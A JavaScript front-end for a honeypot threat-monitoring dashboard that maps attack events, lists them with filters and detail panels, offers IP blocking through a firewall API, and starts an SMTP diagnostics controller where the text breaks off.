/**
 * HoneyTrack - Live Threat Operations & Intelligence Dashboard
 * Integrates Lovable's UI design with HoneyTrack's live Python/Flask backend and SQLite database.
 */
(() => {
  'use strict';

  const $ = (selector) => document.querySelector(selector);
  const escapeHtml = (value) =>
    String(value ?? '').replace(/[&<>"']/g, (char) => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    }[char]));

  const reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;

  // Only run on dashboard page
  if (document.body.dataset.page !== 'dashboard') return;

  // Country name to ISO-2 code mapping
  const COUNTRY_CODES = {
    'united states': 'US',
    'united states of america': 'US',
    'usa': 'US',
    'china': 'CN',
    'russia': 'RU',
    'russian federation': 'RU',
    'germany': 'DE',
    'brazil': 'BR',
    'india': 'IN',
    'netherlands': 'NL',
    'united kingdom': 'GB',
    'great britain': 'GB',
    'uk': 'GB',
    'singapore': 'SG',
    'turkey': 'TR',
    'south korea': 'KR',
    'korea': 'KR',
    'australia': 'AU',
    'france': 'FR',
    'kenya': 'KE',
    'nigeria': 'NG',
    'romania': 'RO'
  };

  const AVAILABLE_FLAGS = new Set([
    'AU', 'BR', 'CN', 'DE', 'FR', 'GB', 'IN', 'KE', 'KR', 'NG', 'NL', 'RO', 'RU', 'SG', 'TR', 'US'
  ]);

  function getCountryCode(countryName) {
    if (!countryName) return 'US';
    const clean = countryName.toLowerCase().trim();
    if (clean.length === 2) return clean.toUpperCase();
    return COUNTRY_CODES[clean] || 'US';
  }

  function flagImage(code) {
    const safeCode = (code || 'US').toUpperCase();
    if (AVAILABLE_FLAGS.has(safeCode)) {
      return `<img class="flag" src="/static/flags/${safeCode}.svg" alt="${safeCode}" onerror="this.style.display='none'">`;
    }
    return `<span class="flag-fallback" style="display:inline-block;padding:0 3px;font-size:9px;font-family:var(--font-mono);border:1px solid var(--border-strong);border-radius:2px;color:var(--muted);">${safeCode}</span>`;
  }

  const severity = (score) => {
    if (score >= 90) return 'CRITICAL';
    if (score >= 70) return 'HIGH';
    if (score >= 40) return 'MEDIUM';
    return 'LOW';
  };

  const riskColor = (score) => {
    if (score >= 70) return 'var(--primary)';
    if (score >= 40) return 'var(--medium)';
    return 'var(--low)';
  };

  const timeAgo = (timestamp) => {
    if (!timestamp) return '—';
    const seconds = Math.max(0, Math.floor((Date.now() - timestamp) / 1000));
    if (seconds < 5) return 'just now';
    if (seconds < 60) return `${seconds}s ago`;
    if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
    if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`;
    return `${Math.floor(seconds / 86400)}d ago`;
  };

  const formatTime = (timestamp) => {
    if (!timestamp) return '00:00:00';
    return new Date(timestamp).toLocaleTimeString('en-GB', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      timeZone: 'UTC'
    });
  };

  const formatDate = (timestamp) => {
    if (!timestamp) return '—';
    return new Date(timestamp).toLocaleString('en-GB', {
      day: '2-digit',
      month: 'short',
      hour: '2-digit',
      minute: '2-digit',
      timeZone: 'UTC'
    }) + ' UTC';
  };

  // State
  let events = [];
  let map;
  const markers = new Map();
  let highestEventId = 0;
  let page = 1;
  const pageSize = 10;
  let selectedEvent = null;
  let lastFocus = null;
  let blockedIpsSet = new Set();

  async function refreshBlockedIps() {
    try {
      const res = await fetch('/api/firewall/blocked');
      if (res.ok) {
        const list = await res.json();
        blockedIpsSet = new Set(list.map((item) => item.ip_address));
      }
    } catch (err) {
      console.warn('[HoneyTrack] Could not load firewall blacklist:', err);
    }
  }

  function normalizeEvent(e) {
    let ts = Date.now();
    if (e.timestamp) {
      const parsed = new Date(e.timestamp.endsWith('Z') ? e.timestamp : e.timestamp + 'Z');
      ts = isNaN(parsed.getTime()) ? new Date(e.timestamp).getTime() : parsed.getTime();
    }
    const country = e.country || 'Unknown';
    const city = e.city || 'Unknown';
    const flag = getCountryCode(country);
    const risk = typeof e.risk_score === 'number' ? Math.round(e.risk_score) : 45;

    return {
      id: Number(e.id),
      ip: e.source_ip || e.ip || '0.0.0.0',
      service: (e.service || 'SSH').toUpperCase(),
      country,
      city,
      flag,
      isp: e.isp || (e.is_tor ? 'Tor Exit Node' : 'Internet Service Provider'),
      lat: typeof e.latitude === 'number' ? e.latitude : (typeof e.lat === 'number' ? e.lat : 20),
      lng: typeof e.longitude === 'number' ? e.longitude : (typeof e.lon === 'number' ? e.lon : 0),
      type: e.attack_type || 'intrusion_attempt',
      risk,
      timestamp: ts,
      username: e.username,
      password: e.password,
      command: e.command,
      user_agent: e.user_agent,
      is_tor: !!e.is_tor
    };
  }

  function animateNumber(element, value, initial = false) {
    if (!element) return;
    const numValue = Number(value) || 0;
    const from = initial ? 0 : Number(element.dataset.value || 0);
    element.dataset.value = numValue;

    if (reduceMotion) {
      element.textContent = numValue.toLocaleString();
      return;
    }

    const start = performance.now();
    const duration = initial ? 600 : 350;

    function frame(t) {
      const progress = Math.min(1, (t - start) / duration);
      element.textContent = Math.round(from + (numValue - from) * (1 - Math.pow(1 - progress, 3))).toLocaleString();
      if (progress < 1) requestAnimationFrame(frame);
    }

    requestAnimationFrame(frame);
    if (!initial) {
      element.classList.remove('stat-flash');
      void element.offsetWidth;
      element.classList.add('stat-flash');
    }
  }

  function updateStatsDisplay(statsData, initial = false) {
    if (statsData) {
      if (statsData.system_mode) {
        const badge = $('#system-mode-badge');
        if (badge) {
          const isProd = statsData.system_mode === 'PRODUCTION';
          badge.className = 'mode-badge ' + (isProd ? 'mode-prod' : 'mode-demo');
          badge.innerHTML = '<span class="mode-dot"></span>' + (isProd ? 'LIVE PRODUCTION' : 'SIMULATION (DEMO)');
          badge.title = isProd ? 'HoneyTrack running in Live Honeypot mode' : 'HoneyTrack running in Simulation (Demo) mode';
          badge.style.cursor = 'default';
        }
      }
      animateNumber($('#total-attacks'), statsData.total_attacks, initial);
      animateNumber($('#unique-ips'), statsData.unique_ips, initial);
      animateNumber($('#countries'), statsData.unique_countries, initial);

      if (statsData.latest_attack) {
        const la = statsData.latest_attack;
        const locText = `${la.city || 'Unknown'}, ${la.country || 'Global'}`;
        if ($('#last-location')) $('#last-location').textContent = locText;
        let ts = Date.now();
        if (la.timestamp) {
          const parsed = new Date(la.timestamp.endsWith('Z') ? la.timestamp : la.timestamp + 'Z');
          ts = isNaN(parsed.getTime()) ? new Date(la.timestamp).getTime() : parsed.getTime();
        }
        if ($('#last-time')) $('#last-time').textContent = `${timeAgo(ts)} · ${formatTime(ts)} UTC`;
      } else {
        if ($('#last-location')) $('#last-location').textContent = '—';
        if ($('#last-time')) $('#last-time').textContent = 'Waiting for decoy interactions';
      }
    } else if (events.length > 0) {
      const uniqueIps = new Set(events.map((e) => e.ip)).size;
      const uniqueCountries = new Set(events.map((e) => e.country)).size;
      animateNumber($('#total-attacks'), events.length, initial);
      animateNumber($('#unique-ips'), uniqueIps, initial);
      animateNumber($('#countries'), uniqueCountries, initial);

      const latest = events[0];
      if ($('#last-location')) $('#last-location').textContent = `${latest.city || 'Unknown'}, ${latest.country || 'Global'}`;
      if ($('#last-time')) $('#last-time').textContent = `${timeAgo(latest.timestamp)} · ${formatTime(latest.timestamp)} UTC`;
    } else {
      animateNumber($('#total-attacks'), 0, initial);
      animateNumber($('#unique-ips'), 0, initial);
      animateNumber($('#countries'), 0, initial);
      if ($('#last-location')) $('#last-location').textContent = '—';
      if ($('#last-time')) $('#last-time').textContent = 'Waiting for decoy interactions';
    }
  }

  // Public hook: window.updateStats({ total, ips, countries, lastAttack, lastLocation })
  window.updateStats = function (d) {
    if (d.total != null) animateNumber($('#total-attacks'), d.total);
    if (d.ips != null) animateNumber($('#unique-ips'), d.ips);
    if (d.countries != null) animateNumber($('#countries'), d.countries);
    if (d.lastAttack) {
      const el = document.getElementById('last-location');
      const timeEl = document.getElementById('last-time');
      if (el) el.textContent = d.lastLocation || timeAgo(d.lastAttack);
      if (timeEl) timeEl.textContent = `${timeAgo(d.lastAttack)} · ${formatTime(d.lastAttack)} UTC`;
    }
  };

  function initMap() {
    if (!window.L) {
      $('#attack-map').textContent = 'Map service offline. Live attack events remain visible in the feed.';
      return;
    }

    map = window.L.map('attack-map', {
      scrollWheelZoom: false,
      zoomControl: true,
      worldCopyJump: true
    }).setView([20, 10], 2);

    const carto = window.L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
      attribution: '&copy; OpenStreetMap contributors &copy; CARTO',
      subdomains: 'abcd',
      maxZoom: 18
    }).addTo(map);

    // Fallback if CARTO tiles fail
    const tileProbe = new Image();
    tileProbe.crossOrigin = 'anonymous';
    tileProbe.onload = () => {
      try {
        const canvas = document.createElement('canvas');
        canvas.width = canvas.height = 256;
        const context = canvas.getContext('2d');
        context.drawImage(tileProbe, 0, 0);
        const pixels = context.getImageData(0, 0, 256, 256).data;
        const samples = new Set();
        for (let i = 0; i < pixels.length; i += 64) samples.add(`${pixels[i]},${pixels[i+1]},${pixels[i+2]}`);
        if (samples.size < 30) {
          map.removeLayer(carto);
          window.L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/Canvas/World_Dark_Gray_Base/MapServer/tile/{z}/{y}/{x}', {
            attribution: 'Tiles &copy; Esri',
            maxZoom: 16
          }).addTo(map);
        }
      } catch (_) {}
    };
    tileProbe.src = 'https://a.basemaps.cartocdn.com/dark_all/2/2/1.png';

    // Plot initial markers
    events.slice(0, 35).reverse().forEach((e) => addMarker(e, false));
  }

  function addMarker(event, isNew) {
    if (!map || typeof event.lat !== 'number' || typeof event.lng !== 'number') return;
    if (event.lat === 0 && event.lng === 0) return;

    // Remove existing marker for this event if re-adding
    if (markers.has(event.id)) {
      map.removeLayer(markers.get(event.id));
    }

    const size = Math.round(10 + event.risk / 11);
    const color = riskColor(event.risk);
    const icon = window.L.divIcon({
      className: '',
      html: `<div class="attack-marker ${isNew ? 'new' : ''}" style="width:${size}px;height:${size}px;background:${color}"></div>`,
      iconSize: [size, size],
      iconAnchor: [size / 2, size / 2]
    });

    // Add slight jitter for duplicate coords
    const jitterLat = event.lat + (Math.random() - 0.5) * 0.8;
    const jitterLng = event.lng + (Math.random() - 0.5) * 0.8;

    const marker = window.L.marker([jitterLat, jitterLng], {
      icon,
      alt: `Attack from ${event.city}, ${event.country}`
    }).addTo(map);

    marker.bindPopup(`
      <div class="popup-ip">${escapeHtml(event.ip)} ${event.is_tor ? '<span class="tor-badge">TOR</span>' : ''}</div>
      <div><strong>${escapeHtml(event.city)}, ${escapeHtml(event.country)}</strong></div>
      <div style="font-family:var(--font-mono);font-size:10px;color:var(--low);margin:2px 0;">Coords: ${typeof event.lat === 'number' ? event.lat.toFixed(2) : 0}, ${typeof event.lng === 'number' ? event.lng.toFixed(2) : 0}</div>
      <div>ISP: ${escapeHtml(event.isp)}</div>
      <div>Service: <strong style="color:var(--foreground)">${escapeHtml(event.service)}</strong> · ${escapeHtml(event.type)}</div>
      <div class="popup-risk" style="color:${color};font-weight:600;margin-top:4px;">Risk: ${event.risk} / 100 (${severity(event.risk)})</div>
    `);

    marker.on('click', () => openPanel(event));
    markers.set(event.id, marker);

    if (markers.size > 30) {
      const oldest = markers.keys().next().value;
      map.removeLayer(markers.get(oldest));
      markers.delete(oldest);
    }
  }

  function feedMarkup(event, isNew = false) {
    const isBlocked = blockedIpsSet.has(event.ip);
    return `
      <button class="feed-item ${isNew ? 'new' : ''}" type="button" data-event-id="${event.id}" aria-label="View details for ${escapeHtml(event.ip)}">
        <span class="feed-top">
          <span class="feed-identity">
            ${flagImage(event.flag)}
            <span class="feed-ip">${escapeHtml(event.ip)}</span>
            ${isBlocked ? '<span class="blocked-badge">BLOCKED</span>' : ''}
          </span>
          <span class="feed-time" data-time="${event.timestamp}">${timeAgo(event.timestamp)}</span>
        </span>
        <span class="feed-bottom">
          <span class="service-badge">${escapeHtml(event.service)}</span>
          <span class="attack-tag">${escapeHtml(event.type)}</span>
          ${event.is_tor ? '<span class="service-badge" style="color:var(--primary);border-color:var(--primary-glow)">TOR</span>' : ''}
        </span>
      </button>
    `;
  }

  function renderFeed() {
    const listEl = $('#feed-list');
    if (!listEl) return;
    if (events.length === 0) {
      listEl.innerHTML = '<p class="profile-empty" style="padding:24px;text-align:center;">Listening for active intrusions...</p>';
      return;
    }
    listEl.innerHTML = events.slice(0, 35).map((e) => feedMarkup(e)).join('');
  }

  function renderTable() {
    const query = ($('#event-search')?.value || '').trim().toLowerCase();
    const serviceFilter = $('#filter-service')?.value || 'ALL';
    const riskFilter = $('#filter-risk')?.value || 'ALL';
    const torFilter = $('#filter-tor')?.value || 'ALL';

    const filtered = events.filter((e) => {
      // 1. Text Search query
      if (query) {
        const hay = `${e.ip} ${e.country} ${e.city} ${e.isp || ''} ${e.service} ${e.type} ${e.risk} ${e.username || ''} ${e.command || ''} ${e.user_agent || ''}`.toLowerCase();
        if (!hay.includes(query)) return false;
      }

      // 2. Service filter
      if (serviceFilter !== 'ALL' && e.service !== serviceFilter) return false;

      // 3. Risk filter
      if (riskFilter !== 'ALL') {
        if (riskFilter === '70' && e.risk < 70) return false;
        if (riskFilter === '40' && (e.risk < 40 || e.risk >= 70)) return false;
        if (riskFilter === 'LOW' && e.risk >= 40) return false;
      }

      // 4. Tor filter
      if (torFilter === 'TOR' && !e.is_tor) return false;
      if (torFilter === 'DIRECT' && e.is_tor) return false;

      return true;
    });

    const totalPages = Math.max(1, Math.ceil(filtered.length / pageSize));
    page = Math.min(page, totalPages);
    const subset = filtered.slice((page - 1) * pageSize, page * pageSize);

    const rowsEl = $('#event-rows');
    if (!rowsEl) return;

    if (subset.length === 0) {
      if (events.length === 0) {
        rowsEl.innerHTML = '<tr><td class="empty-row" colspan="9" style="padding:32px 16px;color:var(--muted);"><span style="color:var(--low);font-weight:600;">● ALL SENSORS LISTENING</span> — No live attacks detected yet. Real-world adversary probes against SSH (2222), HTTP (8080), or FTP (2121) will appear here instantly.</td></tr>';
      } else {
        rowsEl.innerHTML = '<tr><td class="empty-row" colspan="9">No matching events found for active filters</td></tr>';
      }
    } else {
      rowsEl.innerHTML = subset.map((e) => {
        // Payload or credentials
        let payloadContent = '<span style="color:var(--muted-deep);">—</span>';
        if (e.command) {
          payloadContent = `<span class="payload-text payload-cmd" title="${escapeHtml(e.command)}">&gt; ${escapeHtml(e.command)}</span>`;
        } else if (e.username || e.password) {
          payloadContent = `<span class="payload-text" title="${escapeHtml(e.username || '-')}:${escapeHtml(e.password || '-')}">${escapeHtml(e.username || '-')}:${escapeHtml(e.password || '-')}</span>`;
        } else if (e.user_agent) {
          payloadContent = `<span class="payload-text" title="${escapeHtml(e.user_agent)}">UA: ${escapeHtml(e.user_agent)}</span>`;
        }

        const coordsStr = (typeof e.lat === 'number' && typeof e.lng === 'number') 
          ? `${e.lat.toFixed(2)}, ${e.lng.toFixed(2)}` 
          : 'N/A';

        return `
        <tr tabindex="0" role="button" aria-label="View details for ${escapeHtml(e.ip)}" data-event-id="${e.id}">
          <td class="time-cell">${formatTime(e.timestamp)}</td>
          <td class="mono">
            ${escapeHtml(e.ip)}
            ${e.is_tor ? '<span class="tor-badge">TOR</span>' : ''}
            ${blockedIpsSet.has(e.ip) ? '<span class="blocked-badge">BLOCKED</span>' : ''}
          </td>
          <td><span class="country-cell">${flagImage(e.flag)}${escapeHtml(e.city)}, ${escapeHtml(e.country)}</span></td>
          <td><span class="coords-mono">${coordsStr}</span></td>
          <td><span class="isp-text" title="${escapeHtml(e.isp)}">${escapeHtml(e.isp)}</span></td>
          <td><span class="service-badge">${escapeHtml(e.service)}</span></td>
          <td>${escapeHtml(e.type)}</td>
          <td>${payloadContent}</td>
          <td>
            <span class="risk-cell" style="--risk-color:${riskColor(e.risk)}">
              ${e.risk}
              <span class="risk-track">
                <span class="risk-fill" style="width:${e.risk}%"></span>
              </span>
            </span>
          </td>
        </tr>
      `;
      }).join('');
    }

    const paginationStatus = $('#pagination-status');
    if (paginationStatus) {
      paginationStatus.textContent = filtered.length
        ? `SHOWING ${(page - 1) * pageSize + 1}–${Math.min(page * pageSize, filtered.length)} OF ${filtered.length} EVENTS`
        : '0 EVENTS';
    }

    const pageNumber = $('#page-number');
    if (pageNumber) pageNumber.textContent = `${page} / ${totalPages}`;

    const prevBtn = $('#previous-page');
    if (prevBtn) prevBtn.disabled = page === 1;

    const nextBtn = $('#next-page');
    if (nextBtn) nextBtn.disabled = page >= totalPages;
  }

  function panelMarkup(e) {
    const isBlocked = blockedIpsSet.has(e.ip);
    // Find all attempts by this same IP in recent history
    const sameIpEvents = events.filter((item) => item.ip === e.ip);
    const totalAttempts = sameIpEvents.length;

    // Collect credentials
    const credentialsSet = new Set();
    sameIpEvents.forEach((ev) => {
      if (ev.username || ev.password) {
        credentialsSet.add(`${ev.username || 'unknown'}:${ev.password || '******'}`);
      }
    });
    const credentialsList = Array.from(credentialsSet);

    // Collect commands
    const commandsSet = new Set();
    sameIpEvents.forEach((ev) => {
      if (ev.command) commandsSet.add(ev.command);
    });
    const commandsList = Array.from(commandsSet);

    // First and last seen
    const timestamps = sameIpEvents.map((ev) => ev.timestamp);
    const firstSeen = Math.min(...timestamps);
    const lastSeen = Math.max(...timestamps);

    const credentialsHtml = credentialsList.length
      ? `<div class="credential-list">${credentialsList.map((c) => `<span class="credential">${escapeHtml(c)}</span>`).join('')}</div>`
      : '<p class="profile-empty">No credentials captured for this host</p>';

    const commandsHtml = commandsList.length
      ? `<div class="terminal">${commandsList.map((c) => `<div class="terminal-line">${escapeHtml(c)}</div>`).join('')}</div>`
      : '<p class="profile-empty">No commands executed</p>';

    return `
      <h3 class="profile-ip">${escapeHtml(e.ip)}</h3>
      <p class="profile-location">${flagImage(e.flag)} ${escapeHtml(e.city)}, ${escapeHtml(e.country)}</p>

      <div class="profile-gauge-area">
        <div class="risk-gauge" role="meter" aria-label="Risk score" aria-valuemin="0" aria-valuemax="100" aria-valuenow="${e.risk}" style="--gauge-color:${riskColor(e.risk)};--gauge-value:${e.risk}%">
          <div class="risk-gauge-inner">
            <strong>${e.risk}</strong>
            <small>/ 100</small>
          </div>
        </div>
        <div>
          <span class="gauge-label">RISK ASSESSMENT</span>
          <p class="gauge-severity" style="color:${riskColor(e.risk)}">${severity(e.risk)} RISK</p>
        </div>
      </div>

      <section class="profile-section">
        <h3>SOURCE INFORMATION</h3>
        <div class="profile-grid">
          <div class="profile-field">
            <span>Country</span>
            <strong>${escapeHtml(e.country)}</strong>
          </div>
          <div class="profile-field">
            <span>City</span>
            <strong>${escapeHtml(e.city)}</strong>
          </div>
          <div class="profile-field">
            <span>Coordinates (Lat/Lon)</span>
            <strong class="mono" style="color:var(--low);">${typeof e.lat === 'number' ? e.lat.toFixed(4) : 'N/A'}, ${typeof e.lng === 'number' ? e.lng.toFixed(4) : 'N/A'}</strong>
          </div>
          <div class="profile-field">
            <span>ISP / Network</span>
            <strong>${escapeHtml(e.isp)}</strong>
          </div>
          <div class="profile-field">
            <span>Anonymity Profile</span>
            <strong>${e.is_tor ? '<span class="tor-badge" style="margin-left:0;">TOR EXIT NODE (CONFIRMED)</span>' : '<span style="color:var(--muted);">DIRECT PUBLIC IP</span>'}</strong>
          </div>
          <div class="profile-field">
            <span>Recorded Hits</span>
            <strong>${totalAttempts} attempt${totalAttempts > 1 ? 's' : ''}</strong>
          </div>
          <div class="profile-field">
            <span>First Detected</span>
            <strong class="mono">${formatDate(firstSeen)}</strong>
          </div>
          <div class="profile-field">
            <span>Last Detected</span>
            <strong class="mono">${formatDate(lastSeen)}</strong>
          </div>
        </div>
      </section>

      <section class="profile-section">
        <h3>CREDENTIALS TRIED</h3>
        ${credentialsHtml}
      </section>

      <section class="profile-section">
        <h3>COMMANDS EXECUTED</h3>
        ${commandsHtml}
      </section>

      <section class="profile-section">
        <h3>ATTACK CLASSIFICATION</h3>
        <p class="classification">
          ${escapeHtml(e.type)} 
          <span class="service-badge">${escapeHtml(e.service)}</span>
          ${e.is_tor ? '<span class="service-badge" style="color:var(--primary);border-color:var(--primary-glow);margin-left:4px;">TOR EXIT NODE</span>' : ''}
        </p>
      </section>

      <section class="profile-section">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
          <h3 style="margin:0;">ACTIVE FIREWALL MITIGATION</h3>
          <span class="firewall-badge ${isBlocked ? 'blocked' : 'active'}" id="drawer-firewall-badge">
            ${isBlocked ? 'BLOCKED (PACKETS DROPPED)' : 'UNFILTERED (ACTIVE)'}
          </span>
        </div>
        <p style="font-size:11px; color:var(--muted); margin:0 0 12px 0;">
          ${isBlocked 
            ? 'Adversary IP is actively blacklisted. Honeypot decoy listeners will reject incoming connections immediately.' 
            : 'Adversary activity detected. Blacklist this IP in active defense or deploy host firewall rules to prevent deeper intrusion.'}
        </p>
        <button type="button" class="btn-firewall-toggle ${isBlocked ? 'btn-unblock' : 'btn-block'}" id="btn-firewall-toggle-ip" data-ip="${escapeHtml(e.ip)}" data-risk="${e.risk}" data-country="${escapeHtml(e.country)}">
          ${isBlocked ? 'UNBLOCK IP (RESTORE ACCESS)' : 'BLOCK IP (FIREWALL DROP)'}
        </button>

        ${commandsList.length > 0 ? `
        <button type="button" class="btn-fed-action primary" id="btn-drawer-watch-replay" data-ip="${escapeHtml(e.ip)}" style="width:100%;margin-top:10px;display:flex;align-items:center;justify-content:center;gap:8px;padding:9px 14px;background:#22c55e22;border:1px solid #22c55e;color:#22c55e;font-size:11px;font-family:var(--font-mono);font-weight:700;border-radius:4px;cursor:pointer;">
          ▶ WATCH TERMINAL REPLAY FOR THIS IP
        </button>
        ` : `
        <div style="margin-top:10px;padding:8px 12px;background:rgba(255,255,255,0.02);border:1px solid var(--border);border-radius:4px;font-size:10.5px;color:var(--muted);font-family:var(--font-mono);text-align:center;font-style:italic;">
          This attacker has not executed any commands
        </div>
        `}

        <div class="firewall-commands-box">
          <div class="firewall-cmd-header">
            <span>RECOMMENDED HOST FIREWALL RULE</span>
            <button type="button" class="btn-copy-cmd" id="btn-copy-firewall-cmd">COPY</button>
          </div>
          <pre class="firewall-code" id="firewall-cmd-code">sudo ufw insert 1 deny from ${escapeHtml(e.ip)} to any comment 'HoneyTrack Auto-Block'</pre>
        </div>
      </section>
    `;
  }

  async function openPanel(event) {
    selectedEvent = event;
    lastFocus = document.activeElement;

    // Synchronize latest firewall state for this IP
    try {
      const res = await fetch(`/api/firewall/status/${encodeURIComponent(event.ip)}`);
      if (res.ok) {
        const data = await res.json();
        if (data.is_blocked) {
          blockedIpsSet.add(event.ip);
        } else {
          blockedIpsSet.delete(event.ip);
        }
      }
    } catch (_) {}

    $('#panel-body').innerHTML = panelMarkup(event);
    const panel = $('#detail-panel');
    const backdrop = $('#panel-backdrop');
    backdrop.hidden = false;

    requestAnimationFrame(() => {
      panel.classList.add('open');
      backdrop.classList.add('open');
    });

    panel.setAttribute('aria-hidden', 'false');
    document.body.style.overflow = 'hidden';
    $('#panel-close').focus();
  }

  function closePanel() {
    const panel = $('#detail-panel');
    const backdrop = $('#panel-backdrop');
    panel.classList.remove('open');
    backdrop.classList.remove('open');
    panel.setAttribute('aria-hidden', 'true');
    document.body.style.overflow = '';

    window.setTimeout(() => {
      if (!panel.classList.contains('open')) backdrop.hidden = true;
    }, reduceMotion ? 0 : 320);

    if (lastFocus && document.contains(lastFocus)) lastFocus.focus();
    selectedEvent = null;
  }

  // Event handlers
  $('#feed-list')?.addEventListener('click', (e) => {
    const row = e.target.closest('[data-event-id]');
    if (row) {
      const ev = events.find((item) => item.id === Number(row.dataset.eventId));
      if (ev) openPanel(ev);
    }
  });

  $('#event-rows')?.addEventListener('click', (e) => {
    const row = e.target.closest('[data-event-id]');
    if (row) {
      const ev = events.find((item) => item.id === Number(row.dataset.eventId));
      if (ev) openPanel(ev);
    }
  });

  $('#event-rows')?.addEventListener('keydown', (e) => {
    if ((e.key === 'Enter' || e.key === ' ') && e.target.matches('[data-event-id]')) {
      e.preventDefault();
      e.target.click();
    }
  });

  $('#panel-close')?.addEventListener('click', closePanel);
  $('#panel-backdrop')?.addEventListener('click', closePanel);

  // Firewall Mitigation Drawer Action Handlers
  $('#panel-body')?.addEventListener('click', async (e) => {
    const toggleBtn = e.target.closest('#btn-firewall-toggle-ip');
    if (toggleBtn) {
      const ip = toggleBtn.dataset.ip;
      const risk = Number(toggleBtn.dataset.risk || 0);
      const country = toggleBtn.dataset.country || 'Unknown';
      const isCurrentlyBlocked = blockedIpsSet.has(ip);

      toggleBtn.disabled = true;
      toggleBtn.textContent = isCurrentlyBlocked ? 'REMOVING BLOCK...' : 'APPLYING DROP RULE...';

      try {
        const endpoint = isCurrentlyBlocked ? '/api/firewall/unblock' : '/api/firewall/block';
        const bodyData = isCurrentlyBlocked ? { ip } : { ip, risk_score: risk, country, reason: 'Operator Console Manual Blacklist' };
        const res = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(bodyData)
        });
        const data = await res.json();

        if (res.ok && data.success) {
          if (isCurrentlyBlocked) {
            blockedIpsSet.delete(ip);
          } else {
            blockedIpsSet.add(ip);
          }
          if (selectedEvent && selectedEvent.ip === ip) {
            $('#panel-body').innerHTML = panelMarkup(selectedEvent);
          }
          renderFeed();
          renderTable();
        } else {
          alert('Firewall mitigation action failed: ' + (data.message || data.error));
          toggleBtn.disabled = false;
        }
      } catch (err) {
        alert('Network error: ' + err.message);
        toggleBtn.disabled = false;
      }
      return;
    }

    const replayBtn = e.target.closest('#btn-drawer-watch-replay');
    if (replayBtn) {
      const ip = replayBtn.dataset.ip;
      closePanel();
      try {
        const res = await fetch(`/api/federation/search?ip=${encodeURIComponent(ip)}`).then((r) => r.json());
        if (res.session_id) {
          window.openTerminalReplayModal(res.session_id);
        } else {
          window.openTerminalReplayModal();
        }
      } catch (_) {
        window.openTerminalReplayModal();
      }
      return;
    }

    const copyBtn = e.target.closest('#btn-copy-firewall-cmd');
    if (copyBtn) {
      const codeEl = $('#firewall-cmd-code');
      if (codeEl) {
        navigator.clipboard.writeText(codeEl.textContent.trim()).then(() => {
          copyBtn.textContent = 'COPIED!';
          setTimeout(() => { copyBtn.textContent = 'COPY'; }, 2000);
        });
      }
    }
  });

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
      if (selectedEvent) closePanel();
      closeEmailModal();
    }
  });

  function getFilterQuery() {
    const srv = $('#filter-service')?.value || 'ALL';
    const risk = $('#filter-risk')?.value || 'ALL';
    const tor = $('#filter-tor')?.value || 'ALL';
    const search = ($('#event-search')?.value || '').trim();

    const params = new URLSearchParams();
    if (srv !== 'ALL') params.append('service', srv);
    if (risk !== 'ALL') {
      if (risk === 'LOW') params.append('max_risk', '39');
      else params.append('min_risk', risk);
    }
    if (tor === 'TOR') params.append('is_tor', 'true');
    if (tor === 'DIRECT') params.append('is_tor', 'false');
    if (search) params.append('search', search);
    return params;
  }

  function exportPdfReport() {
    const params = getFilterQuery();
    window.location.href = `/api/reports/pdf?${params.toString()}`;
  }

  $('#btn-top-pdf')?.addEventListener('click', (e) => {
    e.preventDefault();
    exportPdfReport();
  });

  // ─────────────────────────────────────────────────────────────
  // Upgraded SMTP Diagnostics & Delivery Controller
  // ─────────────────────────────────────────────────────────────
  const smtpDiagnostics = {
    isOpen: false,
    isDispatching: false,
    cooldownTimer: null,
    logs: [],
    cachedConfig: null
  };

  function escapeDiagHtml(str) {
    if (!str) return '';
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }

  function getDiagTimestamp() {
    const d = new Date();
    const pad = (n, l = 2) => String(n).padStart(l, '0');
    return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}.${pad(d.getMilliseconds(), 3)}`;
  }

  function clearDiagLogs() {
    smtpDiagnostics.logs = [];
    const term = $('#diag-terminal');
    if (term) {
      term.innerHTML = '<div class="empty-state">No diagnostic run yet. Press &ldquo;Send Test Alert&rdquo; to begin.</div>';
    }
    resetDiagSteps();
    setDiagResultState('idle', 'Ready', '—');
  }

  function appendDiagLog(direction, text, type = 's') {
    const time = getDiagTimestamp();
    smtpDiagnostics.logs.push({ time, direction, text, type });
    const term = $('#diag-terminal');
    if (!term) return;

    const empty = term.querySelector('.empty-state');
    if (empty) empty.remove();

    const line = document.createElement('div');
    line.className = `log-line ${type}`;
    line.innerHTML = `<span class="t">${time}</span><span class="d">${escapeDiagHtml(direction)}</span><span class="x">${escapeDiagHtml(text)}</span>`;
    term.appendChild(line);
    term.scrollTop = term.scrollHeight;
  }

  function setDiagResultState(state, text, timingText) {
    const panel = $('#diag-result');
    const pillText = $('#diag-status-pill-text');
    const timingEl = $('#diag-timing');
    const modal = $('#email-modal');

    if (panel) panel.setAttribute('data-state', state);
    if (modal) modal.setAttribute('data-state', state);
    if (pillText) pillText.textContent = text;
    if (timingEl && timingText !== undefined) timingEl.textContent = timingText;
  }

  function resetDiagSteps() {
    const container = $('#diag-steps');
    const fill = $('#diag-step-fill');
    if (container) container.setAttribute('data-ok', 'false');
    if (fill) fill.style.width = '0%';

    const nodes = document.querySelectorAll('#diag-steps .step-node');
    nodes.forEach(node => {
      node.classList.remove('active', 'done', 'fail');
    });
  }

  function updateDiagStep(stepIndex, status) {
    const container = $('#diag-steps');
    const fill = $('#diag-step-fill');
    const nodes = document.querySelectorAll('#diag-steps .step-node');
    if (!nodes.length) return;

    // 5 nodes with centers at 10%, 30%, 50%, 70%, 90%
    // Distance from node 0 (left: 10%) to each node center:
    // Node 0: 0%  (10%)
    // Node 1: 20% (30%)
    // Node 2: 40% (50%)
